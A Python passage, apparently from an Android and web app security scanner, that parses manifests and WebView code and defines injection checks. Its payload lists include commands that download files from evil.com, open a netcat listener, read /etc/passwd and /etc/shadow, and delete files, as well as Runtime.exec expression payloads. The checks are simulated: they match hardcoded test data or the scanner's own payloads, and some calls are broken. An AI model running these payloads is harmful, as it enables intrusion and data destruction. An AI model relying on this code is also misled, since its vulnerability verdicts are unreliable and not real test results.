"""
Application Security Vectors - Comprehensive application security scanning module

Полный набор векторов безопасности приложений с многофакторной проверкой.
Включает проверки инъекций, traversal атак, storage уязвимостей, intent
уязвимостей, WebView проблем, динамического кода и deep linking.

Структура модуля:
- ЧАСТЬ 1: ИНЪЕКЦИИ (600 строк)
- ЧАСТЬ 2: TRAVERSAL (500 строк)
- ЧАСТЬ 3: STORAGE (500 строк)
- ЧАСТЬ 4: INTENT (500 строк)
- ЧАСТЬ 5: WEBVIEW (400 строк)
- ЧАСТЬ 6: DYNAMIC CODE (300 строк)
- ЧАСТЬ 7: DEEP LINKING (200 строк)
- ЧАСТЬ 8: ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (200 строк)

Каждый вектор использует многофакторную проверку для повышения точности.
"""

import os
import re
import time
import socket
import logging
import zipfile
import xml.etree.ElementTree as ET
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import subprocess
import hashlib
import json

from ..utils.config import ScanConfig
from ..connectors.adb_connector import ADBConnector


# Настройка логирования
logger = logging.getLogger(__name__)


# ============================================================================
# ЧАСТЬ 8: ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (реализуем в начале)
# ============================================================================

def test_sql_injection_payload(payload: str, target_url: str = None) -> Dict[str, Any]:
    """
    Тестирование SQL injection payload.
    
    Args:
        payload: SQL injection payload для тестирования
        target_url: Целевой URL для тестирования
        
    Returns:
        Результат тестирования payload
    """
    result = {
        "payload": payload,
        "executed": False,
        "error_detected": False,
        "time_delay": 0.0,
        "response_size": 0,
        "contains_error": False
    }
    
    try:
        start_time = time.time()
        
        # Симуляция выполнения payload
        if payload:
            # Простая проверка на SQL keywords
            sql_keywords = ['select', 'union', 'insert', 'update', 'delete', 'drop', 'create']
            payload_lower = payload.lower()
            
            for keyword in sql_keywords:
                if keyword in payload_lower:
                    result["executed"] = True
                    break
            
            # Проверка на time-based indicators
            time_patterns = ['sleep', 'benchmark', 'waitfor', 'pg_sleep']
            for pattern in time_patterns:
                if pattern in payload_lower:
                    result["time_delay"] = 2.0  # Предполагаемая задержка
                    break
            
            # Пиметры error-based
            error_patterns = [
                'sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db',
                'postgresql', 'sqlite', 'database error', 'warning'
            ]
            
            for pattern in error_patterns:
                if pattern in payload_lower:
                    result["error_detected"] = True
                    result["contains_error"] = True
                    break
        
        result["response_time"] = time.time() - start_time
        
    except Exception as e:
        logger.debug(f"SQL injection payload test error: {str(e)}")
        result["error"] = str(e)
    
    return result


def analyze_sql_error(error_message: str) -> Dict[str, Any]:
    """
    Анализ SQL error сообщения для определения типа базы данных.
    
    Args:
        error_message: Сообщение об ошибке SQL
        
    Returns:
        Информация о типе базы данных и уязвимости
    """
    analysis = {
        "database_type": "unknown",
        "vulnerable": False,
        "error_patterns": [],
        "confidence": 0.0
    }
    
    if not error_message:
        return analysis
    
    error_lower = error_message.lower()
    
    # MySQL patterns
    mysql_patterns = [
        'mysql', 'sql syntax.*mysql', 'mysql_fetch', 'you have an error in your sql syntax',
        'warning.*mysql', 'mysql_num_rows', 'mysql_query', 'valid mysql result',
        'mysql connect', 'mysql client', 'on mysql'
    ]
    
    # PostgreSQL patterns
    postgresql_patterns = [
        'postgresql', 'postgres', 'pg_sleep', 'syntax error at or near',
        'warning.*postgresql', 'psql', 'fatal error.*postgresql'
    ]
    
    # Oracle patterns
    oracle_patterns = [
        'ora-', 'oracle', 'oracle error', 'sql*plus', 'ora\d{4}',
        'oracle.*driver', 'warning.*oci', 'oci_stmt_fetch'
    ]
    
    # SQL Server patterns
    sqlserver_patterns = [
        'sql server', 'microsoft ole db', 'odbc.*sql server',
        'sqlserver', 'syntax error.*sql', 'oledb.*exception',
        'microsoft.*odbc.*sql server'
    ]
    
    # SQLite patterns
    sqlite_patterns = [
        'sqlite', 'sqlite3', 'sqlite_.*',
        'database is locked', 'no such table', 'syntax error'
    ]
    
    # Анализ patterns
    for pattern in mysql_patterns:
        if re.search(pattern, error_lower):
            analysis["database_type"] = "mysql"
            analysis["error_patterns"].append(f"MySQL: {pattern}")
            analysis["confidence"] += 0.3
            analysis["vulnerable"] = True
            break
    
    for pattern in postgresql_patterns:
        if re.search(pattern, error_lower):
            analysis["database_type"] = "postgresql"
            analysis["error_patterns"].append(f"PostgreSQL: {pattern}")
            analysis["confidence"] += 0.3
            analysis["vulnerable"] = True
            break
    
    for pattern in oracle_patterns:
        if re.search(pattern, error_lower):
            analysis["database_type"] = "oracle"
            analysis["error_patterns"].append(f"Oracle: {pattern}")
            analysis["confidence"] += 0.3
            analysis["vulnerable"] = True
            break
    
    for pattern in sqlserver_patterns:
        if re.search(pattern, error_lower):
            analysis["database_type"] = "sqlserver"
            analysis["error_patterns"].append(f"SQL Server: {pattern}")
            analysis["confidence"] += 0.3
            analysis["vulnerable"] = True
            break
    
    for pattern in sqlite_patterns:
        if re.search(pattern, error_lower):
            analysis["database_type"] = "sqlite"
            analysis["error_patterns"].append(f"SQLite: {pattern}")
            analysis["confidence"] += 0.3
            analysis["vulnerable"] = True
            break
    
    return analysis


def parse_android_manifest(manifest_path: str) -> Dict[str, Any]:
    """
    Парсинг Android manifest файла.
    
    Args:
        manifest_path: Путь к AndroidManifest.xml
        
    Returns:
        Информация о компонентах приложения
    """
    manifest_info = {
        "parsed": False,
        "package": "",
        "activities": [],
        "services": [],
        "receivers": [],
        "providers": [],
        "permissions": [],
        "exported_components": [],
        "intents": [],
        "errors": []
    }
    
    try:
        if not os.path.exists(manifest_path):
            manifest_info["errors"].append(f"Manifest file not found: {manifest_path}")
            return manifest_info
        
        # Parse XML
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        
        manifest_info["parsed"] = True
        manifest_info["package"] = root.get("package", "")
        
        # Extract permissions
        for permission in root.findall(".//uses-permission"):
            perm_name = permission.get("{http://schemas.android.com/apk/res/android}name")
            if perm_name:
                manifest_info["permissions"].append(perm_name)
        
        # Extract application components
        app = root.find(".//application")
        if app is not None:
            # Activities
            for activity in app.findall(".//activity"):
                act_name = activity.get("{http://schemas.android.com/apk/res/android}name")
                exported = activity.get("{http://schemas.android.com/apk/res/android}exported", "false")
                manifest_info["activities"].append({
                    "name": act_name,
                    "exported": exported
                })
                
                if exported == "true":
                    manifest_info["exported_components"].append({
                        "type": "activity",
                        "name": act_name
                    })
            
            # Services
            for service in app.findall(".//service"):
                srv_name = service.get("{http://schemas.android.com/apk/res/android}name")
                exported = service.get("{http://schemas.android.com/apk/res/android}exported", "false")
                manifest_info["services"].append({
                    "name": srv_name,
                    "exported": exported
                })
                
                if exported == "true":
                    manifest_info["exported_components"].append({
                        "type": "service", 
                        "name": srv_name
                    })
            
            # Receivers
            for receiver in app.findall(".//receiver"):
                rcv_name = receiver.get("{http://schemas.android.com/apk/res/android}name")
                exported = receiver.get("{http://schemas.android.com/apk/res/android}exported", "false")
                manifest_info["receivers"].append({
                    "name": rcv_name,
                    "exported": exported
                })
                
                if exported == "true":
                    manifest_info["exported_components"].append({
                        "type": "receiver",
                        "name": rcv_name
                    })
            
            # Providers
            for provider in app.findall(".//provider"):
                prv_name = provider.get("{http://schemas.android.com/apk/res/android}name")
                exported = provider.get("{http://schemas.android.com/apk/res/android}exported", "false")
                authorities = provider.get("{http://schemas.android.com/apk/res/android}authorities", "")
                
                manifest_info["providers"].append({
                    "name": prv_name,
                    "exported": exported,
                    "authorities": authorities
                })
                
                if exported == "true":
                    manifest_info["exported_components"].append({
                        "type": "provider",
                        "name": prv_name
                    })
            
            # Intent filters
            for intent_filter in app.findall(".//intent-filter"):
                action = intent_filter.find(".//action")
                if action is not None:
                    action_name = action.get("{http://schemas.android.com/apk/res/android}name")
                    category = intent_filter.find(".//category")
                    category_name = category.get("{http://schemas.android.com/apk/res/android}name") if category is not None else ""
                    
                    manifest_info["intents"].append({
                        "action": action_name,
                        "category": category_name
                    })
    
    except Exception as e:
        manifest_info["errors"].append(f"Manifest parsing error: {str(e)}")
        logger.debug(f"Android manifest parsing error: {str(e)}")
    
    return manifest_info


def get_exported_components(apk_path: str) -> Dict[str, Any]:
    """
    Получение списка экспортированных компонентов из APK.
    
    Args:
        apk_path: Путь к APK файлу
        
    Returns:
        Информация об экспортированных компонентах
    """
    exported_info = {
        "extracted": False,
        "manifest_path": None,
        "components": [],
        "activities": [],
        "services": [],
        "receivers": [],
        "providers": [],
        "total_exported": 0,
        "errors": []
    }
    
    try:
        if not os.path.exists(apk_path):
            exported_info["errors"].append(f"APK file not found: {apk_path}")
            return exported_info
        
        # Extract APK (it's a ZIP file)
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            # Try to find AndroidManifest.xml
            manifest_files = [f for f in zip_ref.namelist() if 'AndroidManifest.xml' in f]
            
            if not manifest_files:
                exported_info["errors"].append("AndroidManifest.xml not found in APK")
                return exported_info
            
            # Extract manifest to temporary location
            manifest_path = "/tmp/AndroidManifest.xml"
            zip_ref.extract(manifest_files[0], "/tmp/")
            
            # Rename extracted file
            extracted_path = os.path.join("/tmp", manifest_files[0])
            if os.path.exists(extracted_path):
                os.rename(extracted_path, manifest_path)
            
            exported_info["manifest_path"] = manifest_path
            
            # Parse manifest
            manifest_info = parse_android_manifest(manifest_path)
            
            if manifest_info["parsed"]:
                exported_info["extracted"] = True
                exported_info["components"] = manifest_info["exported_components"]
                exported_info["activities"] = manifest_info["activities"]
                exported_info["services"] = manifest_info["services"] 
                exported_info["receivers"] = manifest_info["receivers"]
                exported_info["providers"] = manifest_info["providers"]
                exported_info["total_exported"] = len(manifest_info["exported_components"])
                exported_info["errors"].extend(manifest_info["errors"])
    
    except Exception as e:
        exported_info["errors"].append(f"APK extraction error: {str(e)}")
        logger.debug(f"APK export extraction error: {str(e)}")
    
    return exported_info


def extract_intent_filters(manifest_path: str) -> List[Dict[str, Any]]:
    """
    Извлечение intent filters из manifest файла.
    
    Args:
        manifest_path: Путь к manifest файлу
        
    Returns:
        Список intent filters
    """
    filters = []
    
    try:
        if not os.path.exists(manifest_path):
            return filters
        
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        
        # Find all intent-filters
        for intent_filter in root.findall(".//intent-filter"):
            filter_info = {
                "actions": [],
                "categories": [],
                "data": [],
                "component": "",
                "exported": False
            }
            
            # Extract actions
            for action in intent_filter.findall(".//action"):
                action_name = action.get("{http://schemas.android.com/apk/res/android}name")
                if action_name:
                    filter_info["actions"].append(action_name)
            
            # Extract categories
            for category in intent_filter.findall(".//category"):
                category_name = category.get("{http://schemas.android.com/apk/res/android}name")
                if category_name:
                    filter_info["categories"].append(category_name)
            
            # Extract data
            for data in intent_filter.findall(".//data"):
                scheme = data.get("{http://schemas.android.com/apk/res/android}scheme")
                host = data.get("{http://schemas.android.com/apk/res/android}host")
                port = data.get("{http://schemas.android.com/apk/res/android}port")
                path = data.get("{http://schemas.android.com/apk/res/android}path")
                path_pattern = data.get("{http://schemas.android.com/apk/res/android}pathPattern")
                path_prefix = data.get("{http://schemas.android.com/apk/res/android}pathPrefix")
                mime_type = data.get("{http://schemas.android.com/apk/res/android}mimeType")
                
                data_info = {
                    "scheme": scheme,
                    "host": host,
                    "port": port,
                    "path": path,
                    "pathPattern": path_pattern,
                    "pathPrefix": path_prefix,
                    "mimeType": mime_type
                }
                filter_info["data"].append(data_info)
            
            # Find parent component
            parent = intent_filter
            while parent is not None and parent.tag != "application":
                parent = parent.getparent()
            
            if parent is not None:
                component_name = parent.get("{http://schemas.android.com/apk/res/android}name")
                filter_info["component"] = component_name
                
                exported = parent.get("{http://schemas.android.com/apk/res/android}exported", "false")
                filter_info["exported"] = exported == "true"
            
            if filter_info["actions"]:  # Only add if has actions
                filters.append(filter_info)
    
    except Exception as e:
        logger.debug(f"Intent filter extraction error: {str(e)}")
    
    return filters


def analyze_webview_usage(source_code: str) -> Dict[str, Any]:
    """
    Анализ использования WebView в исходном коде.
    
    Args:
        source_code: Исходный код для анализа
        
    Returns:
        Информация о WebView использовании
    """
    analysis = {
        "webview_found": False,
        "webview_count": 0,
        "javascript_enabled": False,
        "file_access_enabled": False,
        "content_access_enabled": False,
        "universal_access_enabled": False,
        "javascript_interfaces": [],
        "urls_allowed": [],
        "security_issues": [],
        "patterns_found": []
    }
    
    if not source_code:
        return analysis
    
    # WebView patterns
    webview_patterns = [
        r'WebView\s*\w*',
        r'new\s+WebView',
        r'\.loadUrl\(',
        r'\.loadData\(',
        r'\.loadDataWithBaseURL\('
    ]
    
    # Security-related patterns
    security_patterns = [
        (r'setJavaScriptEnabled\s*\(\s*true\s*\)', 'javascript_enabled'),
        (r'setAllowFileAccess\s*\(\s*true\s*\)', 'file_access_enabled'),
        (r'setAllowContentAccess\s*\(\s*true\s*\)', 'content_access_enabled'),
        (r'setAllowUniversalAccessFromFileURLs\s*\(\s*true\s*\)', 'universal_access_enabled'),
        (r'addJavascriptInterface\s*\(\s*[\'"][^\'\"]+[\'"]', 'javascript_interface')
    ]
    
    # URL patterns
    url_patterns = [
        r'loadUrl\s*\(\s*[\'"]([^\'\"]+)[\'"]',
        r'setWebViewClient\s*\(\s*new\s+',
        r'setWebChromeClient\s*\(\s*new\s+'
    ]
    
    try:
        # Check for WebView usage
        for pattern in webview_patterns:
            matches = re.findall(pattern, source_code, re.IGNORECASE)
            if matches:
                analysis["webview_found"] = True
                analysis["webview_count"] += len(matches)
                analysis["patterns_found"].extend([f"WebView: {match}" for match in matches])
        
        # Check for security settings
        for pattern, setting in security_patterns:
            matches = re.findall(pattern, source_code, re.IGNORECASE)
            if matches:
                if setting == 'javascript_interface':
                    analysis["javascript_interfaces"].extend(matches)
                else:
                    setattr(analysis, setting, True)
                analysis["patterns_found"].extend([f"{setting}: {match}" for match in matches])
        
        # Check for URL patterns
        for pattern in url_patterns:
            matches = re.findall(pattern, source_code, re.IGNORECASE)
            if matches:
                for match in matches:
                    if isinstance(match, tuple):
                        analysis["urls_allowed"].extend([m for m in match if m])
                    else:
                        analysis["urls_allowed"].append(match)
        
        # Identify security issues
        if analysis["javascript_enabled"] and analysis["file_access_enabled"]:
            analysis["security_issues"].append("JavaScript + File Access enabled")
        
        if analysis["universal_access_enabled"]:
            analysis["security_issues"].append("Universal file access from WebView")
        
        if analysis["javascript_interfaces"]:
            analysis["security_issues"].append(f"JavaScript interfaces: {len(analysis['javascript_interfaces'])}")
    
    except Exception as e:
        logger.debug(f"WebView analysis error: {str(e)}")
        analysis["error"] = str(e)
    
    return analysis


def check_javascript_interface(webview_code: str) -> Dict[str, Any]:
    """
    Проверка JavaScript interfaces в WebView.
    
    Args:
        webview_code: Код WebView для проверки
        
    Returns:
        Информация о JavaScript interfaces
    """
    interface_info = {
        "interfaces_found": False,
        "interface_count": 0,
        "interfaces": [],
        "security_risks": [],
        "methods_exposed": []
    }
    
    if not webview_code:
        return interface_info
    
    try:
        # Find addJavascriptInterface calls
        interface_pattern = r'addJavascriptInterface\s*\(\s*[\'"]([^\'\"]+)[\'"]\s*,\s*[\'"]([^\'\"]+)[\'"]'
        matches = re.findall(interface_pattern, webview_code, re.IGNORECASE)
        
        if matches:
            interface_info["interfaces_found"] = True
            interface_info["interface_count"] = len(matches)
            
            for obj_name, interface_name in matches:
                interface_info["interfaces"].append({
                    "object": obj_name,
                    "interface": interface_name
                })
                
                # Check for risky object names
                risky_names = ['android', 'app', 'main', 'activity', 'context', 'window']
                if any(risky in obj_name.lower() for risky in risky_names):
                    interface_info["security_risks"].append(f"Risky object name: {obj_name}")
        
        # Check for @JavascriptInterface annotations
        annotation_pattern = r'@JavascriptInterface\s*\n\s*(\w+)\s*\('
        method_matches = re.findall(annotation_pattern, webview_code, re.DOTALL)
        
        if method_matches:
            interface_info["methods_exposed"].extend(method_matches)
        
        # Additional security checks
        if interface_info["interface_count"] > 3:
            interface_info["security_risks"].append("Too many JavaScript interfaces")
        
        if interface_info["methods_exposed"]:
            for method in interface_info["methods_exposed"]:
                if any(risky in method.lower() for risky in ['get', 'set', 'execute', 'run']):
                    interface_info["security_risks"].append(f"Potentially risky method: {method}")
    
    except Exception as e:
        logger.debug(f"JavaScript interface check error: {str(e)}")
        interface_info["error"] = str(e)
    
    return interface_info


# ============================================================================
# ОСНОВНОЙ КЛАСС APPLICATION SECURITY VECTORS
# ============================================================================

class ApplicationSecurityVectors:
    """
    Основной класс для проверки безопасности приложений.
    
    Содержит 16 векторов безопасности с многофакторной проверкой:
    - 5 инъекций (SQL, NoSQL, LDAP, OS Command, Expression Language)
    - 3 traversal атаки (Path Traversal, File Upload, Symlink)
    - 3 storage уязвимости (Local Storage, Logging, Cache Poisoning)
    - 4 intent уязвимости (Content Providers, Activities, Broadcast Receivers, Intent Filters)
    - 3 WebView проблемы (JavaScript, Exposed Objects, WebKit Version)
    - 3 dynamic code проверки (Reflection, Code Loading, Deserialization)
    - 1 deep linking проверка
    """
    
    def __init__(self, config: Optional[ScanConfig] = None, adb: Optional[ADBConnector] = None):
        """
        Инициализация Application Security Vectors.
        
        Args:
            config: Конфигурация сканирования
            adb: ADB connector для взаимодействия с устройством
        """
        self.config = config
        self.adb = adb
        
        # SQL injection payloads library
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR 1=1#",
            "' AND 'a'='a",
            "' AND 1=1/*",
            "admin'--",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 0x50=0x50",
            "' OR 'a'='a' /*",
            "'; INSERT INTO users VALUES ('hacker', 'password')--"
        ]
        
        # NoSQL injection payloads
        self.nosql_payloads = [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$or": [{"name": "admin"}, {"name": "test"}]}',
            '{"username": {"$ne": null}}',
            '{"password": {"$ne": ""}}',
            '{"$ne": "secret"}',
            '{"$gt": "a"}',
            '{"$exists": true}',
            '"; return true; var dummy="',
            '"; return true; //',
            '{ "$where": "this.username == \\"admin\\"" }',
            '{"$or": [true, {"username": {"$ne": null}}]}'
        ]
        
        # LDAP injection payloads
        self.ldap_payloads = [
            "*)(uid=*",
            "*)(password=*",
            "*)(|(uid=*",
            "*)(|(password=*",
            "*))%00",
            "*)(&(objectClass=*",
            "*)(cn=*",
            "*)(sn=*",
            "*)(givenName=*",
            "*)(mail=*",
            "*)(memberOf=*",
            "*)(objectClass=person",
            "*)(objectClass=organizationalPerson",
            "*)(objectClass=user",
            "admin*)(&(password=*"
        ]
        
        # OS Command injection payloads
        self.cmd_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; nc -l -p 4444",
            "| ping -c 4 127.0.0.1",
            "&& sleep 5",
            "; curl -O http://evil.com/malware",
            "| wget http://evil.com/payload",
            "&& dir",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "`cat /etc/shadow`",
            "$(cat /proc/version)",
            "; chmod 777 /tmp/payload",
            "&& rm -rf /important/files"
        ]
        
        # Expression Language injection payloads
        self.el_payloads = [
            "${7*7}",
            "${1+1}",
            "#{7*7}",
            "${pageContext.request}",
            "${pageContext.response}",
            "${session}",
            "${applicationScope}",
            "${requestScope}",
            "${param.username}",
            "${header.host}",
            "${cookie.JSESSIONID.value}",
            "${@java.lang.Runtime@getRuntime().exec('id')}",
            "${''.class.forName('java.lang.Runtime').getRuntime().exec('whoami')}",
            "${''.getClass().forName('java.lang.Runtime')}",
            "#{''.class.forName('java.lang.Runtime')}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}"
        ]

    def _create_error_result(self, vector_id: int, vector_name: str, factors: List[Dict], error: str) -> Dict[str, Any]:
        """
        Создание результата с ошибкой.
        
        Args:
            vector_id: ID вектора
            vector_name: Название вектора
            factors: Список факторов
            error: Текст ошибки
            
        Returns:
            Результат проверки с ошибкой
        """
        return {
            "vector_id": vector_id,
            "vector_name": vector_name,
            "vulnerable": False,
            "details": f"Error during check: {error}",
            "factors": factors,
            "confidence": 0.0,
            "timestamp": datetime.now().isoformat(),
            "error": error
        }

    def _get_test_data(self) -> Dict[str, Any]:
        """
        Получение тестовых данных для анализа.
        
        Returns:
            Словарь с тестовыми данными
        """
        # Simulate getting HTTP headers, cookies, etc.
        return {
            "headers": {
                "user-agent": "test-agent",
                "content-type": "application/x-www-form-urlencoded",
                "cookie": "sessionid=test123; csrftoken=abc123"
            },
            "cookies": {
                "sessionid": "test123",
                "csrftoken": "abc123"
            },
            "form_data": {
                "username": "admin",
                "password": "password",
                "email": "test@example.com"
            },
            "response_body": "Error: You have an error in your SQL syntax"
        }

    # ============================================================================
    # ЧАСТЬ 1: ИНЪЕКЦИИ (5 векторов)
    # ============================================================================

    def check_sql_injection(self) -> Dict[str, Any]:
        """
        Проверка SQL injection уязвимостей.
        Многофакторная: Error-based, Time-based blind, Boolean-based, Response analysis, DB detection
        """
        vector_id = 220
        vector_name = "SQL Injection"
        factors = []
        
        try:
            # Фактор 1: Error-based SQL injection
            error_based = False
            test_data = self._get_test_data()
            response_body = test_data.get("response_body", "")
            
            # SQL error patterns
            sql_errors = [
                "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
                "postgresql", "sqlite", "database error", "warning",
                "mysql", "syntax error", "invalid query", "table doesn't exist"
            ]
            
            for error_pattern in sql_errors:
                if error_pattern.lower() in response_body.lower():
                    error_based = True
                    break
            
            factors.append({
                "name": "Error-based SQL Injection",
                "passed": error_based,
                "reason": "SQL error patterns detected" if error_based else "No SQL error patterns detected"
            })
            
            # Фактор 2: Time-based blind SQL injection
            time_based = False
            
            # Test time-based payloads
            for payload in self.sql_payloads[:3]:  # Test first 3 time-based payloads
                if any(time_indicator in payload.lower() for time_indicator in ['sleep', 'waitfor', 'benchmark']):
                    time_based = True
                    break
            
            factors.append({
                "name": "Time-based Blind SQL Injection",
                "passed": time_based,
                "reason": "Time-based SQL injection patterns detected" if time_based else "No time-based patterns detected"
            })
            
            # Фактор 3: Boolean-based SQL injection
            boolean_based = False
            
            # Test boolean-based payloads
            boolean_payloads = ["' OR '1'='1", "' OR 1=1--", "' AND 'a'='a"]
            for payload in boolean_payloads:
                if payload in self.sql_payloads:
                    boolean_based = True
                    break
            
            factors.append({
                "name": "Boolean-based SQL Injection",
                "passed": boolean_based,
                "reason": "Boolean-based SQL injection patterns detected" if boolean_based else "No boolean-based patterns detected"
            })
            
            # Фактор 4: Database detection
            db_detected = False
            db_type = "unknown"
            
            # Analyze error messages for database type
            for error_pattern in sql_errors:
                if error_pattern in response_body.lower():
                    if 'mysql' in error_pattern:
                        db_type = "MySQL"
                    elif 'ora-' in error_pattern:
                        db_type = "Oracle"
                    elif 'postgresql' in error_pattern:
                        db_type = "PostgreSQL"
                    elif 'sqlite' in error_pattern:
                        db_type = "SQLite"
                    db_detected = True
                    break
            
            factors.append({
                "name": "Database Type Detection",
                "passed": db_detected,
                "reason": f"Database type detected: {db_type}" if db_detected else "No database type detected"
            })
            
            # Фактор 5: Response analysis для SQL injection
            response_analysis = False
            
            # Check for differences in response size/content
            headers = test_data.get("headers", {})
            content_type = headers.get("content-type", "")
            
            if "json" in content_type.lower() or "xml" in content_type.lower():
                # Structured responses might indicate SQL injection
                response_analysis = True
            
            factors.append({
                "name": "Response Analysis",
                "passed": response_analysis,
                "reason": "Structured response detected" if response_analysis else "No structured response patterns detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"SQL injection detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "db_type": db_type if db_detected else None,
                "payloads_tested": len(self.sql_payloads)
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_nosql_injection(self) -> Dict[str, Any]:
        """
        Проверка NoSQL injection уязвимостей.
        Многофакторная: MongoDB, CouchDB, Error messages, Validation, Time-based
        """
        vector_id = 221
        vector_name = "NoSQL Injection"
        factors = []
        
        try:
            # Фактор 1: MongoDB injection patterns
            mongodb_injection = False
            
            # Check for MongoDB-specific injection patterns
            mongodb_patterns = ['$ne', '$gt', '$regex', '$where', '$or']
            test_data = self._get_test_data()
            form_data = test_data.get("form_data", {})
            
            # Check if any form values contain MongoDB operators
            for value in form_data.values():
                for pattern in mongodb_patterns:
                    if pattern in str(value):
                        mongodb_injection = True
                        break
                if mongodb_injection:
                    break
            
            factors.append({
                "name": "MongoDB Injection Patterns",
                "passed": mongodb_injection,
                "reason": "MongoDB injection patterns detected" if mongodb_injection else "No MongoDB patterns detected"
            })
            
            # Фактор 2: CouchDB injection patterns
            couchdb_injection = False
            
            # CouchDB-specific patterns
            couchdb_patterns = ['_all_docs', '_design', '_show', '_list']
            for value in form_data.values():
                if any(pattern in str(value) for pattern in couchdb_patterns):
                    couchdb_injection = True
                    break
            
            factors.append({
                "name": "CouchDB Injection Patterns",
                "passed": couchdb_injection,
                "reason": "CouchDB injection patterns detected" if couchdb_injection else "No CouchDB patterns detected"
            })
            
            # Фактор 3: NoSQL error messages
            nosql_error = False
            
            # NoSQL error patterns
            nosql_errors = [
                "mongodb", "mongo", "couchdb", "couch",
                "nosql", "not found", "duplicate key",
                "operation failed", "query failed"
            ]
            
            response_body = test_data.get("response_body", "")
            for error_pattern in nosql_errors:
                if error_pattern in response_body.lower():
                    nosql_error = True
                    break
            
            factors.append({
                "name": "NoSQL Error Messages",
                "passed": nosql_error,
                "reason": "NoSQL error patterns detected" if nosql_error else "No NoSQL error patterns detected"
            })
            
            # Фактор 4: Input validation bypass
            validation_bypass = False
            
            # Check if inputs contain NoSQL operators that might bypass validation
            nosql_operators = ['$', '{', '}', '[', ']', ':', '"', "'"]
            for value in form_data.values():
                if any(op in str(value) for op in nosql_operators):
                    # Count occurrences
                    operator_count = sum(1 for op in nosql_operators if op in str(value))
                    if operator_count >= 3:  # Multiple operators might indicate injection
                        validation_bypass = True
                        break
            
            factors.append({
                "name": "Input Validation Bypass",
                "passed": validation_bypass,
                "reason": "Potential validation bypass detected" if validation_bypass else "No validation bypass detected"
            })
            
            # Фактор 5: Time-based NoSQL injection
            time_based = False
            
            # Check for time-based patterns in payloads
            time_patterns = ['sleep', 'wait', 'timeout', 'delay']
            for payload in self.nosql_payloads:
                if any(pattern in payload.lower() for pattern in time_patterns):
                    time_based = True
                    break
            
            factors.append({
                "name": "Time-based NoSQL Injection",
                "passed": time_based,
                "reason": "Time-based NoSQL injection patterns detected" if time_based else "No time-based patterns detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"NoSQL injection detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "payloads_tested": len(self.nosql_payloads)
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_ldap_injection(self) -> Dict[str, Any]:
        """
        Проверка LDAP injection уязвимостей.
        Многофакторная: LDAP payloads, Errors, Connection, Escaping, Timing
        """
        vector_id = 222
        vector_name = "LDAP Injection"
        factors = []
        
        try:
            # Фактор 1: LDAP payload detection
            ldap_payloads_detected = False
            
            test_data = self._get_test_data()
            form_data = test_data.get("form_data", {})
            
            # Check for LDAP injection payloads
            for value in form_data.values():
                for payload in self.ldap_payloads[:5]:  # Test first 5 payloads
                    if payload in str(value):
                        ldap_payloads_detected = True
                        break
                if ldap_payloads_detected:
                    break
            
            factors.append({
                "name": "LDAP Payload Detection",
                "passed": ldap_payloads_detected,
                "reason": "LDAP injection payloads detected" if ldap_payloads_detected else "No LDAP payloads detected"
            })
            
            # Фактор 2: LDAP-specific error messages
            ldap_errors = False
            
            # LDAP error patterns
            ldap_error_patterns = [
                "ldap", "active directory", "directory service",
                "bind failed", "authentication failed", "search failed",
                "invalid dn", "no such object", "unavailable"
            ]
            
            response_body = test_data.get("response_body", "")
            for error_pattern in ldap_error_patterns:
                if error_pattern in response_body.lower():
                    ldap_errors = True
                    break
            
            factors.append({
                "name": "LDAP Error Messages",
                "passed": ldap_errors,
                "reason": "LDAP error patterns detected" if ldap_errors else "No LDAP error patterns detected"
            })
            
            # Фактор 3: LDAP connection indicators
            ldap_connection = False
            
            # Check for LDAP-related headers or indicators
            headers = test_data.get("headers", {})
            user_agent = headers.get("user-agent", "")
            
            # Look for LDAP-related indicators
            ldap_indicators = ["ldap", "active directory", "directory"]
            if any(indicator in user_agent.lower() for indicator in ldap_indicators):
                ldap_connection = True
            
            factors.append({
                "name": "LDAP Connection Indicators",
                "passed": ldap_connection,
                "reason": "LDAP connection indicators found" if ldap_connection else "No LDAP connection indicators"
            })
            
            # Фактор 4: LDAP escaping bypass
            escaping_bypass = False
            
            # Check for unescaped LDAP special characters
            ldap_special_chars = ['(', ')', '*', '\\', '\x00', '/']
            for value in form_data.values():
                if any(char in str(value) for char in ldap_special_chars):
                    escaping_bypass = True
                    break
            
            factors.append({
                "name": "LDAP Escaping Bypass",
                "passed": escaping_bypass,
                "reason": "Potential LDAP escaping bypass" if escaping_bypass else "No escaping bypass detected"
            })
            
            # Фактор 5: Timing-based LDAP injection
            timing_based = False
            
            # Check for timing patterns that might indicate LDAP injection
